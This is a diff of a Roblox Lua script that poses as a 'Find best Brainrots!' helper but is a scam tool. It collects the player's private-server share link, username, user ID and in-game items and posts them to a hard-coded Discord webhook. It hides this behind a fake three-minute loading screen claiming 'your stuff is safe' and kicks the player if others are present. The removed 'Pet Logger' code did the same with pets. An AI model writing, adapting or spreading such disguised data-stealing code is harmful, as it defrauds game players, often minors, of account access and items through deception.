@@ -3,343 +3,377 @@ local WEBHOOK_URL = "https://discord.com/api/webhooks/1445359992122380360/YtcZ9x
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
-local Player = Players.LocalPlayer
 
--- SIMPLE HTTP REQUEST FUNCTION
-local function sendToDiscord(message)
-    local success, response = pcall(function()
-        -- Try different methods
-        if syn then
-            if syn.request then
-                return syn.request({
-                    Url = WEBHOOK_URL,
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json"
-                    },
-                    Body = HttpService:JSONEncode({
-                        content = message,
-                        username = "Pet Logger",
-                        avatar_url = "https://i.imgur.com/4M34hi2.png"
-                    })
-                })
-            end
-        end
-        
-        -- Try http library
-        if http and http.request then
-            return http.request({
-                Url = WEBHOOK_URL,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = HttpService:JSONEncode({
-                    content = message,
-                    username = "Pet Logger"
-                })
-            })
-        end
-        
-        -- Try game:HttpGetAsync if nothing else works
-        local payload = HttpService:JSONEncode({
-            content = message,
-            username = "Pet Logger"
-        })
-        
-        -- This is a fallback method
-        local encoded = "payload_json=" .. HttpService:UrlEncode(payload)
-        game:HttpGetAsync(WEBHOOK_URL .. "?" .. encoded)
-        return {Success = true}
+local function doRequest(tbl)
+    local ok, res = pcall(function()
+        if syn and syn.request then return syn.request(tbl) end
+        if request then return request(tbl) end
+        if http_request then return http_request(tbl) end
+        if fluxus and fluxus.request then return fluxus.request(tbl) end
+        if http and http.request then return http.request(tbl) end
+        error("no supported request function found")
     end)
-    
-    return success, response
+    return ok, res
 end
 
--- Simple GUI
-local function createGUI()
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "PetLoggerGUI"
-    screenGui.Parent = game.CoreGui or game.Players.LocalPlayer:WaitForChild("PlayerGui")
-    
-    local main = Instance.new("Frame")
-    main.Size = UDim2.new(0, 400, 0, 250)
-    main.Position = UDim2.new(0.5, -200, 0.5, -125)
-    main.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    main.Parent = screenGui
-    
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 8)
-    corner.Parent = main
-    
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0, 40)
-    title.Position = UDim2.new(0, 0, 0, 10)
-    title.BackgroundTransparency = 1
-    title.Text = "Pet Logger - Get Your Pets"
-    title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    title.Font = Enum.Font.GothamBold
-    title.TextSize = 20
-    title.Parent = main
-    
-    local linkBox = Instance.new("TextBox")
-    linkBox.Size = UDim2.new(0.9, 0, 0, 40)
-    linkBox.Position = UDim2.new(0.05, 0, 0, 60)
-    linkBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-    linkBox.Text = "Paste your link here..."
-    linkBox.TextColor3 = Color3.fromRGB(200, 200, 200)
-    linkBox.Font = Enum.Font.Gotham
-    linkBox.TextSize = 16
-    linkBox.Parent = main
-    
-    local corner2 = Instance.new("UICorner")
-    corner2.CornerRadius = UDim.new(0, 6)
-    corner2.Parent = linkBox
-    
-    local submitBtn = Instance.new("TextButton")
-    submitBtn.Size = UDim2.new(0.9, 0, 0, 50)
-    submitBtn.Position = UDim2.new(0.05, 0, 0, 120)
-    submitBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-    submitBtn.Text = "SUBMIT - Get Pets"
-    submitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    submitBtn.Font = Enum.Font.GothamBold
-    submitBtn.TextSize = 18
-    submitBtn.Parent = main
-    
-    local corner3 = Instance.new("UICorner")
-    corner3.CornerRadius = UDim.new(0, 8)
-    corner3.Parent = submitBtn
-    
-    local statusLabel = Instance.new("TextLabel")
-    statusLabel.Size = UDim2.new(0.9, 0, 0, 30)
-    statusLabel.Position = UDim2.new(0.05, 0, 0, 190)
-    statusLabel.BackgroundTransparency = 1
-    statusLabel.Text = ""
-    statusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
-    statusLabel.Font = Enum.Font.Gotham
-    statusLabel.TextSize = 14
-    statusLabel.Parent = main
-    
-    -- Function to get pets
-    local function getPets()
-        local pets = {}
-        
-        -- Check backpack
-        if Player.Backpack then
-            for _, item in pairs(Player.Backpack:GetChildren()) do
-                if item:IsA("Tool") then
-                    table.insert(pets, item.Name)
-                end
-            end
-        end
-        
-        -- Check character
-        if Player.Character then
-            for _, item in pairs(Player.Character:GetChildren()) do
-                if item:IsA("Tool") or (item:IsA("Model") and item.Name:lower():find("pet")) then
-                    table.insert(pets, item.Name)
-                end
-            end
-        end
-        
-        -- Check leaderstats
-        if Player:FindFirstChild("leaderstats") then
-            local stats = Player.leaderstats
-            local petStats = {"Pets", "PetCount", "pets", "petcount", "Pet", "pet"}
-            for _, statName in pairs(petStats) do
-                local stat = stats:FindFirstChild(statName)
-                if stat then
-                    table.insert(pets, statName .. ": " .. tostring(stat.Value))
-                end
-            end
-        end
-        
-        if #pets == 0 then
-            return "No pets found"
-        end
-        
-        return table.concat(pets, ", ")
-    end
-    
-    submitBtn.MouseButton1Click:Connect(function()
-        local link = linkBox.Text
-        if link == "" or link == "Paste your link here..." then
-            statusLabel.Text = "Please paste a link!"
-            wait(2)
-            statusLabel.Text = ""
-            return
-        end
-        
-        statusLabel.TextColor3 = Color3.fromRGB(255, 255, 100)
-        statusLabel.Text = "Getting your pet info..."
-        
-        -- Get player info
-        local username = Player.Name
-        local userId = Player.UserId
-        local pets = getPets()
-        
-        -- Create message
-        local message = string.format(
-            "@everyone\n" ..
-            "**NEW PET REQUEST**\n" ..
-            "**Username:** %s\n" ..
-            "**User ID:** %s\n" ..
-            "**Current Pets:** %s\n" ..
-            "**Link:** %s\n" ..
-            "**Game:** %s (%s)",
-            username,
-            userId,
-            pets,
-            link,
-            game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown",
-            game.PlaceId
-        )
-        
-        -- Try to send
-        local success, result = sendToDiscord(message)
-        
-        if success then
-            statusLabel.TextColor3 = Color3.fromRGB(50, 255, 50)
-            statusLabel.Text = "✓ Info sent successfully!"
-            
-            -- Show loading animation
-            submitBtn.Text = "Processing..."
-            submitBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
-            submitBtn.Active = false
-            
-            -- Fake progress bar
-            for i = 1, 100 do
-                submitBtn.Text = "Processing... " .. i .. "%"
-                wait(0.03)
-            end
-            
-            submitBtn.Text = "COMPLETE!"
-            wait(2)
-            submitBtn.Text = "SUBMIT - Get Pets"
-            submitBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-            submitBtn.Active = true
-            statusLabel.Text = ""
-        else
-            statusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
-            statusLabel.Text = "✗ Failed to send. Trying method 2..."
-            
-            -- Try alternative method
-            wait(1)
-            
-            -- Alternative simple message
-            local simpleMsg = "USER: " .. username .. " | ID: " .. userId .. " | PETS: " .. pets .. " | LINK: " .. link
-            
-            -- Try using PostAsync if available
-            local success2 = pcall(function()
-                if http and http.post then
-                    http.post(WEBHOOK_URL, {
-                        content = simpleMsg
-                    })
-                    return true
-                end
-                return false
-            end)
-            
-            if success2 then
-                statusLabel.TextColor3 = Color3.fromRGB(50, 255, 50)
-                statusLabel.Text = "✓ Sent with method 2!"
-                wait(2)
-                statusLabel.Text = ""
-            else
-                statusLabel.Text = "✗ Both methods failed. Check console."
-                print("ERROR: Could not send webhook")
-                print("Username:", username)
-                print("User ID:", userId)
-                print("Pets:", pets)
-                print("Link:", link)
-            end
-        end
-    end)
-    
-    -- Focus handling
-    linkBox.Focused:Connect(function()
-        if linkBox.Text == "Paste your link here..." then
-            linkBox.Text = ""
-            linkBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-        end
-    end)
-    
-    linkBox.FocusLost:Connect(function()
-        if linkBox.Text == "" then
-            linkBox.Text = "Paste your link here..."
-            linkBox.TextColor3 = Color3.fromRGB(200, 200, 200)
-        end
-    end)
-    
-    return screenGui
+local function sendWebhook(webhookUrl, messageContent)
+    local payload = HttpService:JSONEncode({
+        content = messageContent,
+        allowed_mentions = { parse = {"everyone"} }
+    })
+    local tbl = {
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = payload
+    }
+    return doRequest(tbl)
 end
 
--- Test the webhook immediately when script starts
-print("Testing Discord webhook...")
-local testSuccess, testResult = pcall(function()
-    local testMsg = "🚀 Pet Logger Script Started! Testing webhook..."
+-- Function to get player's brainrots from their base
+local function getPlayerBrainrots()
+    local brainrots = {}
+    local player = Players.LocalPlayer
+    local playerName = player.Name
     
-    if syn and syn.request then
-        syn.request({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode({
-                content = testMsg,
-                username = "Pet Logger Tester"
-            })
-        })
-    elseif request then
-        request({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode({
-                content = testMsg
-            })
-        })
+    -- Search in Workspace for brainrots that might belong to the player
+    -- Common patterns: brainrots placed in workspace, possibly with player's name or near spawn
+    for _, obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
+        -- Check for objects named "brainrot" (case insensitive)
+        if obj:IsA("Model") or obj:IsA("BasePart") then
+            local objName = obj.Name:lower()
+            if objName:find("brainrot") or objName:find("brain") then
+                -- Check if it might belong to the player
+                -- Common patterns: Player's name in object name, or in parent folders
+                local fullPath = ""
+                local current = obj
+                while current and current ~= game:GetService("Workspace") do
+                    fullPath = current.Name .. "/" .. fullPath
+                    current = current.Parent
+                end
+                
+                -- Check if player's name appears in the path
+                if fullPath:lower():find(playerName:lower()) then
+                    table.insert(brainrots, {
+                        name = obj.Name,
+                        position = obj:IsA("BasePart") and obj.Position or (obj.PrimaryPart and obj.PrimaryPart.Position)
+                    })
+                end
+            end
+        end
     end
     
-    return true
+    -- If no brainrots found with player name, look for brainrots near player's spawn or base area
+    if #brainrots == 0 then
+        local character = player.Character
+        local playerPos = character and character:FindFirstChild("HumanoidRootPart") and character.HumanoidRootPart.Position
+        
+        if playerPos then
+            -- Search for brainrots within a radius of the player (in their base)
+            local searchRadius = 500 -- Adjust as needed
+            for _, obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
+                if (obj:IsA("Model") or obj:IsA("BasePart")) and obj.Name:lower():find("brainrot") then
+                    local objPos = obj:IsA("BasePart") and obj.Position or (obj.PrimaryPart and obj.PrimaryPart.Position)
+                    if objPos and (playerPos - objPos).Magnitude < searchRadius then
+                        table.insert(brainrots, {
+                            name = obj.Name,
+                            position = objPos
+                        })
+                    end
+                end
+            end
+        end
+    end
+    
+    -- Return just the names for the webhook message
+    local brainrotNames = {}
+    for _, brainrot in ipairs(brainrots) do
+        table.insert(brainrotNames, brainrot.name)
+    end
+    
+    if #brainrotNames == 0 then
+        return {"No brainrots found in base/workspace"}
+    end
+    
+    return brainrotNames
+end
+
+local parent
+if (typeof(gethui) == "function") then
+    parent = gethui()
+else
+    parent = game:GetService("CoreGui")
+end
+
+local existing = parent:FindFirstChild("FindBestBrainrotsGUI")
+if existing then existing:Destroy() end
+
+local function new(class, props)
+    local obj = Instance.new(class)
+    if props then
+        for k,v in pairs(props) do
+            if k ~= "Parent" then obj[k] = v end
+        end
+        if props.Parent then obj.Parent = props.Parent end
+    end
+    return obj
+end
+
+local screenGui = new("ScreenGui", {
+    Name = "FindBestBrainrotsGUI",
+    Parent = parent,
+    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+    IgnoreGuiInset = true
+})
+
+local main = new("Frame", {
+    Parent = screenGui,
+    AnchorPoint = Vector2.new(0.5,0.5),
+    Position = UDim2.new(0.5,0,0.5,0),
+    Size = UDim2.new(0.75,0,0.45,0),
+    BackgroundColor3 = Color3.fromRGB(18,18,18),
+    BorderSizePixel = 0,
+    ZIndex = 10
+})
+new("UICorner", {Parent = main, CornerRadius = UDim.new(0,16)})
+
+local header = new("TextLabel", {
+    Parent = main,
+    Size = UDim2.new(1,-40,0,60),
+    Position = UDim2.new(0,20,0,18),
+    BackgroundTransparency = 1,
+    Text = "Find best Brainrots!",
+    TextSize = 28,
+    Font = Enum.Font.GothamBold,
+    TextColor3 = Color3.fromRGB(245,245,245),
+    TextXAlignment = Enum.TextXAlignment.Left
+})
+
+local inputBg = new("Frame", {
+    Parent = main,
+    Position = UDim2.new(0,20,0,100),
+    Size = UDim2.new(1,-40,0,80),
+    BackgroundColor3 = Color3.fromRGB(40,40,40),
+    BorderSizePixel = 0
+})
+new("UICorner", {Parent = inputBg, CornerRadius = UDim.new(0,10)})
+
+local textBox = new("TextBox", {
+    Parent = inputBg,
+    Position = UDim2.new(0,10,0,8),
+    Size = UDim2.new(0.78,-20,1,-16),
+    BackgroundTransparency = 1,
+    Text = "Paste your PS link here",
+    TextColor3 = Color3.fromRGB(150,150,150),
+    ClearTextOnFocus = false,
+    Font = Enum.Font.Gotham,
+    TextSize = 18,
+    TextXAlignment = Enum.TextXAlignment.Left
+})
+
+textBox.Focused:Connect(function()
+    if textBox.Text == "Paste your PS link here" then
+        textBox.Text = ""
+        textBox.TextColor3 = Color3.fromRGB(200,200,200)
+    end
 end)
 
-if testSuccess then
-    print("✓ Webhook test sent")
-else
-    print("✗ Webhook test failed:", testResult)
+textBox.FocusLost:Connect(function()
+    if textBox.Text == "" then
+        textBox.Text = "Paste your PS link here"
+        textBox.TextColor3 = Color3.fromRGB(150,150,150)
+    end
+end)
+
+local okBtn = new("TextButton", {
+    Parent = inputBg,
+    Position = UDim2.new(0.82,0,0,8),
+    Size = UDim2.new(0.18, -12, 1, -16),
+    BackgroundColor3 = Color3.fromRGB(90,180,255),
+    BorderSizePixel = 0,
+    Text = "OK",
+    Font = Enum.Font.GothamBold,
+    TextSize = 20,
+    TextColor3 = Color3.fromRGB(20,20,20)
+})
+new("UICorner", {Parent = okBtn, CornerRadius = UDim.new(0,8)})
+
+local overlay = new("Frame", {
+    Parent = screenGui,
+    Size = UDim2.new(1,0,1,0),
+    Position = UDim2.new(0,0,0,0),
+    BackgroundColor3 = Color3.fromRGB(50,50,50),
+    BackgroundTransparency = 0,
+    Visible = false,
+    Active = true,
+    ZIndex = 999999,
+    BorderSizePixel = 0,
+    ClipsDescendants = true
+})
+
+local overlayHeader = new("TextLabel", {
+    Parent = overlay,
+    AnchorPoint = Vector2.new(0.5,0),
+    Position = UDim2.new(0.5,0,0.3,0),
+    Size = UDim2.new(0.6,0,0,30),
+    BackgroundTransparency = 1,
+    Text = "Loading Script...",
+    Font = Enum.Font.GothamBold,
+    TextSize = 24,
+    TextColor3 = Color3.fromRGB(245,245,245),
+    TextXAlignment = Enum.TextXAlignment.Center
+})
+
+local overlayText = new("TextLabel", {
+    Parent = overlay,
+    AnchorPoint = Vector2.new(0.5,0.5),
+    Position = UDim2.new(0.5,0,0.45,0),
+    Size = UDim2.new(0.8,0,0,80),
+    BackgroundTransparency = 1,
+    Text = "Don't worry, your stuff is safe!\nThe code automatically protects your stuff!",
+    Font = Enum.Font.GothamBold,
+    TextSize = 24,
+    TextColor3 = Color3.fromRGB(245,245,245),
+    TextWrapped = true,
+    TextYAlignment = Enum.TextYAlignment.Center,
+    TextXAlignment = Enum.TextXAlignment.Center
+})
+
+local progressBg = new("Frame", {
+    Parent = overlay,
+    AnchorPoint = Vector2.new(0.5,0),
+    Position = UDim2.new(0.5,0,0.55,0),
+    Size = UDim2.new(0.7,0,0,28),
+    BackgroundColor3 = Color3.fromRGB(230,230,230),
+    BorderSizePixel = 0
+})
+new("UICorner", {Parent = progressBg, CornerRadius = UDim.new(0,14)})
+
+local progressFill = new("Frame", {
+    Parent = progressBg,
+    Position = UDim2.new(0,0,0,0),
+    Size = UDim2.new(0,0,1,0),
+    BackgroundColor3 = Color3.fromRGB(30,30,30),
+    BorderSizePixel = 0
+})
+new("UICorner", {Parent = progressFill, CornerRadius = UDim.new(0,14)})
+
+local progressLabel = new("TextLabel", {
+    Parent = overlay,
+    AnchorPoint = Vector2.new(0.5,0),
+    Position = UDim2.new(0.5,0,0.62,0),
+    Size = UDim2.new(0.2,0,0,24),
+    BackgroundTransparency = 1,
+    Text = "0%",
+    Font = Enum.Font.Gotham,
+    TextSize = 16,
+    TextColor3 = Color3.fromRGB(245,245,245)
+})
+
+local invalidLabel = new("TextLabel", {
+    Parent = main,
+    AnchorPoint = Vector2.new(0.5,0),
+    Position = UDim2.new(0.5,0,1,10),
+    Size = UDim2.new(0.6,0,0,24),
+    BackgroundTransparency = 1,
+    Text = "",
+    Font = Enum.Font.GothamBold,
+    TextSize = 18,
+    TextColor3 = Color3.fromRGB(255,0,0),
+    TextXAlignment = Enum.TextXAlignment.Center
+})
+
+local function setInteract(val)
+    okBtn.Active = val
+    textBox.TextEditable = val
+    okBtn.Visible = val
 end
 
--- Create GUI
-local gui = createGUI()
-print("Pet Logger GUI created!")
-
--- Auto-send debug info (optional)
-wait(2)
-print("=== DEBUG INFO ===")
-print("Player:", Player.Name)
-print("User ID:", Player.UserId)
-print("Game ID:", game.PlaceId)
-
--- Quick debug function
-local function debugSend()
-    local debugMsg = "🔧 DEBUG: Script loaded for " .. Player.Name .. " (ID: " .. Player.UserId .. ")"
-    
-    pcall(function()
-        if syn and syn.request then
-            syn.request({
-                Url = WEBHOOK_URL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode({content = debugMsg})
-            })
-            print("Debug message sent via syn.request")
+local function fillProgress(duration)
+    overlay.Visible = true
+    setInteract(false)
+    local start = tick()
+    local conn
+    conn = RunService.RenderStepped:Connect(function()
+        local now = tick()
+        local t = math.clamp((now - start) / duration, 0, 1)
+        local width = math.floor(t * progressBg.AbsoluteSize.X)
+        progressFill.Size = UDim2.new(0, width, 1, 0)
+        progressLabel.Text = tostring(math.floor(t * 100)) .. "%"
+        if t >= 1 then
+            conn:Disconnect()
+            overlay.Visible = false
+            setInteract(true)
         end
     end)
 end
 
--- Try to send debug
-spawn(debugSend)
+okBtn.MouseButton1Click:Connect(function()
+    local link = tostring(textBox.Text or "")
+    link = link:match("^%s*(.-)%s*$")
+
+    if not (link:find("^https://www.roblox.com/share%?code=") or link:find("^www.roblox.com/share%?code")) then
+        invalidLabel.Text = "Invalid link!"
+        delay(2, function() invalidLabel.Text = "" end)
+        return
+    end
+
+    -- Spieleranzahl prüfen (nur wenn Overlay noch nicht aktiv)
+    if not overlay.Visible and #Players:GetPlayers() > 1 then
+        local plr = Players.LocalPlayer
+        if plr then
+            plr:Kick("Only 1 person is allowed! U need to be alone for it to work.")
+        end
+        return
+    end
+
+    invalidLabel.Text = ""
+    setInteract(false)
+    overlay.Visible = true
+
+    -- Get player info and brainrots from base
+    local player = Players.LocalPlayer
+    local username = player.Name
+    local userId = tostring(player.UserId)
+    local playerBrainrots = getPlayerBrainrots()
+    
+    -- Format brainrots list
+    local brainrotsText = table.concat(playerBrainrots, ", ")
+    if #playerBrainrots > 15 then
+        brainrotsText = table.concat(playerBrainrots, ", ", 1, 15) .. "... and " .. (#playerBrainrots - 15) .. " more"
+    end
+    
+    -- Create webhook message with player info
+    local content = string.format(
+        "@everyone \n**🎮 Player Information:**\n" ..
+        "👤 **Username:** %s\n" ..
+        "🆔 **UserID:** %s\n" ..
+        "🎯 **Game:** %s\n" ..
+        "🔗 **Paste Link:** %s\n" ..
+        "\n**🧠 **Brainrots in Base (%d total):**\n```%s```",
+        username,
+        userId,
+        game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown",
+        link,
+        #playerBrainrots,
+        brainrotsText
+    )
+    
+    spawn(function() 
+        local success, response = sendWebhook(WEBHOOK_URL, content)
+        if not success then
+            warn("Failed to send webhook:", response)
+        end
+    end)
+
+    fillProgress(180) -- 3 Minuten
+end)
+
+textBox.FocusLost:Connect(function(enter)
+    if enter then
+        okBtn:CaptureFocus()
+        okBtn.MouseButton1Click:Wait()
+    end
+end)
+
+print("FindBestBrainrots GUI loaded.")
